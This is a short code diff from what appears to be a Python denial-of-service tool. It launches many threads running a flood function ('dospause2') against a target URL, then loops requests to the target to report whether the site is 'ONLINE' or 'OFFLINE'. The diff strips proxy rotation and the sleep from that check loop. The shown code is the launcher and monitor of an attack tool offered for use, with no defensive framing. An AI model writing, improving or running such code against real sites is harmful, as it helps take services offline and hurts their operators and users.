@@ -162,18 +162,13 @@ else:
     for i in range(0, threads):
         thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
-print(colorama.Fore.GREEN + "All threads are running! \n")
+print(colorama.Fore.GREEN + "All threads are running!")
+print(Style.RESET_ALL)
 
-proxyagenthttp = random.choice(proxy_http)
-proxieshttphttp = {
-        'http': f'http://{proxyagenthttp}'
-    }
-    
 while True:
-    checksite = requests.post(url, proxies=proxieshttphttp)
+    checksite = requests.post(url)
     if checksite.status_code >= 500:
         statustext = "OFFLINE"
     elif checksite.status_code >= 200:
         statustext = "ONLINE"
     print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
-    time.sleep(1)
